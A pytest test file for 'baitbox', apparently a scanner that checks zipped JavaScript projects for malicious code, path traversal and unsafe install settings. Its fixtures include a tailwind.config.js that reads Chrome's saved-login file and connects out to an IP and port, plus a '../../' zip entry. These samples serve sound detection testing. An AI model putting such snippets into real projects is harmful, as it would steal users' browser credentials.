import json
import zipfile

import baitbox
from conftest import needs_sandbox, write


def make_zip(tmp_path, files):
    z = tmp_path / "project.zip"
    with zipfile.ZipFile(z, "w") as zf:
        for name, data in files.items():
            zf.writestr(f"proj/{name}", data)
    return z


def test_static_only_clean(tmp_path, capsys):
    z = make_zip(tmp_path, {"index.js": "console.log('hi')\n", "README.md": "hello\n"})
    out = tmp_path / "check"
    code = baitbox.main(["check", str(z), "--out", str(out), "--static-only", "--offline", "--json"])
    rep = json.loads(capsys.readouterr().out)
    assert code == 0 and rep["verdict"] == "nothing-seen"
    for name in ("report.md", "report.json", "scan.txt", "deps.txt", "intake.json"):
        assert (out / name).exists()


def test_static_only_known_malware(tmp_path, capsys):
    z = make_zip(tmp_path, {
        "tailwind.config.js": "module.exports = { plugins: [require('tw-motion-css')({})] }\n",
        "package.json": json.dumps({"dependencies": {"tw-motion-css": "^2.0.2"}}),
    })
    code = baitbox.main(["check", str(z), "--out", str(tmp_path / "c"), "--static-only", "--offline"])
    assert code == 2
    assert "Malware found" in (tmp_path / "c" / "report.md").read_text()


def test_review_verdict_for_medium_static_findings(tmp_path, capsys):
    z = make_zip(tmp_path, {"server.js": "require('child_process').execSync('ls')\n"})
    code = baitbox.main(["check", str(z), "--out", str(tmp_path / "c"), "--static-only", "--offline", "--json"])
    assert code == 0 and json.loads(capsys.readouterr().out)["verdict"] == "review"


def test_unsafe_zip_is_suspicious(tmp_path, capsys):
    z = tmp_path / "evil.zip"
    with zipfile.ZipFile(z, "w") as zf:
        zf.writestr("../../escape.js", "x")
        zf.writestr("ok.js", "1")
    code = baitbox.main(["check", str(z), "--out", str(tmp_path / "c"), "--static-only", "--offline", "--json"])
    rep = json.loads(capsys.readouterr().out)
    assert code == 1 and rep["verdict"] == "suspicious"
    assert not (tmp_path / "escape.js").exists()


def test_refuses_non_empty_out(tmp_path):
    out = tmp_path / "c"
    write(out, "x", "1")
    assert baitbox.main(["check", str(tmp_path), "--out", str(out), "--static-only", "--offline"]) == 3


def test_missing_source(tmp_path):
    assert baitbox.main(["check", str(tmp_path / "nope.zip"), "--out", str(tmp_path / "c"), "--static-only"]) == 3


def test_bad_timeouts(tmp_path):
    import pytest

    with pytest.raises(SystemExit):
        baitbox.main(["check", str(tmp_path), "--run-timeout", "5"])


def test_package_dirs_and_workspaces(tmp_path):
    write(tmp_path, "package.json", json.dumps({"workspaces": ["packages/*"]}))
    write(tmp_path, "packages/a/package.json", "{}")
    write(tmp_path, "other/package.json", "{}")
    write(tmp_path, "other/node_modules/x/package.json", "{}")
    write(tmp_path, "a/b/c/d/e/package.json", "{}")
    dirs = [str(d) for d in baitbox.find_package_dirs(tmp_path)]
    assert dirs == ["."]
    write(tmp_path / "two", "front/package.json", "{}")
    write(tmp_path / "two", "back/package.json", "{}")
    assert sorted(str(d) for d in baitbox.find_package_dirs(tmp_path / "two")) == ["back", "front"]


def test_install_command_uses_safe_flags(tmp_path):
    write(tmp_path, "a/package.json", "{}")
    write(tmp_path, "a/package-lock.json", "{}")
    write(tmp_path, "b/package.json", "{}")
    write(tmp_path, "b/pnpm-lock.yaml", "")
    write(tmp_path, "c d/package.json", "{}")
    write(tmp_path, "c d/yarn.lock", "")
    from pathlib import Path

    cmd, notes = baitbox.install_command(tmp_path, [Path("a"), Path("b"), Path("c d")])
    assert cmd.count("--ignore-scripts") >= 4 and "--ignore-pnpmfile" in cmd
    assert "'c d'" in cmd and "yarn" in notes[0]


def test_npmrc_is_disabled_and_restored(tmp_path):
    write(tmp_path, ".npmrc", "//registry.npmjs.org/:_authToken=secret\n")
    write(tmp_path, "sub/.npmrc", "registry=https://evil.example\n")
    moved = baitbox.disable_npmrcs(tmp_path)
    assert len(moved) == 2 and not (tmp_path / ".npmrc").exists()
    baitbox.restore_npmrcs(moved)
    assert (tmp_path / ".npmrc").read_text().startswith("//registry") and (tmp_path / "sub/.npmrc").exists()


def test_run_command_quotes_paths(tmp_path):
    from pathlib import Path

    write(tmp_path, "my app/package.json", json.dumps({"scripts": {"build": "x", "dev": "y", "test": "z"}}))
    cmd = baitbox.run_command(tmp_path, [Path("my app")], ["my app/vite.config.ts"], 500)
    assert "'my app'" in cmd and "npm run build" in cmd and "npm run test" not in cmd
    assert "--experimental-strip-types" in cmd and "sleep 30" in cmd


@needs_sandbox
def test_selftest_passes(capsys):
    assert baitbox.main(["selftest"]) == 0
    assert "Self-test passed" in capsys.readouterr().out


@needs_sandbox
def test_full_check_of_config_attack(tmp_path, capsys):
    z = make_zip(tmp_path, {
        "package.json": json.dumps({"name": "demo", "version": "1.0.0", "scripts": {"build": "node -e 1"}}),
        "tailwind.config.js": (
            "const fs = require('fs'), os = require('os'), net = require('net');\n"
            "try { fs.readFileSync(os.homedir() + '/.config/google-chrome/Default/Login Data') } catch (e) {}\n"
            "net.connect(1224, '153.75.88.215').on('error', () => {});\n"
            "module.exports = { content: [] };\n"
        ),
    })
    code = baitbox.main(["check", str(z), "--out", str(tmp_path / "c"), "--offline", "--run-timeout", "120", "--json"])
    rep = json.loads(capsys.readouterr().out)
    assert code == 2 and rep["verdict"] == "malicious"
    text = json.dumps(rep["findings"])
    assert "153.75.88.215:1224" in text and "Login Data" in text


def test_node_modules_noise_is_left_out_unless_package_flagged():
    scans = [("static scan", {"autorun": [], "findings": [
        {"severity": "high", "kind": "bidi-control", "file": "node_modules/.pnpm/vite@7.3.6/node_modules/vite/dist/x.js", "line": 3, "what": "bidi control", "snippet": "x", "in_node_modules": True},
        {"severity": "medium", "kind": "packed-code", "file": "node_modules/@codentra/postcss-kinetix/src/config.js", "line": 0, "what": "packed", "snippet": "", "in_node_modules": True},
        {"severity": "high", "kind": "known-malware", "file": "node_modules/tw-motion-css/package.json", "line": 2, "what": "known malware", "snippet": "tw-motion-css", "in_node_modules": True},
    ]})]
    depss = [("packages", {"findings": [], "packages": [{"name": "@codentra/postcss-kinetix", "severity": "high"}, {"name": "vite", "severity": None}]})]
    found, hidden = baitbox.collect_findings({"skipped": []}, scans, depss, None)
    files = " ".join(f["what"] for f in found)
    assert hidden == 1 and "vite" not in files
    assert "postcss-kinetix" in files and "tw-motion-css" in files


def test_nm_package_name():
    assert baitbox.nm_package("node_modules/.pnpm/a@1/node_modules/@s/b/dist/x.js") == "@s/b"
    assert baitbox.nm_package("x/node_modules/lodash/index.js") == "lodash"
    assert baitbox.nm_package("src/index.js") is None
